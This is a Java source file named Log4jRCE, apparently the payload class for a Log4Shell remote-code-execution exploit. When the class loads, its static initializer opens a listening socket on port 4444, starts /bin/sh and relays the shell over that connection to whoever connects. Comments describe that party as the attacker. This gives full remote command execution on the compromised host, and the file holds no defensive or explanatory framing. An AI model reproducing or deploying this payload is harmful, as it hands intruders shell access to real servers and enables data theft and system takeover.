import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Log4jRCE {
    static {
        try {
            while (true) { // Loop to keep the server running after each connection
                // Listen on port 4444
                ServerSocket server = new ServerSocket(4444);
                Socket client = server.accept(); // Accept incoming connection from attacker
                
                // Start a shell process
                Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();

                // Forward input/output between the shell and the attacker's connection
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = client.getInputStream();
                OutputStream po = p.getOutputStream(), so = client.getOutputStream();

                // Transfer data between streams
                while (!client.isClosed()) {
                    while (pi.available() > 0) {
                        so.write(pi.read());
                    }
                    while (pe.available() > 0) {
                        so.write(pe.read());
                    }
                    while (si.available() > 0) {
                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {
                        // Shell is still running, continue looping
                    }
                }
                p.destroy();
                client.close();
                server.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
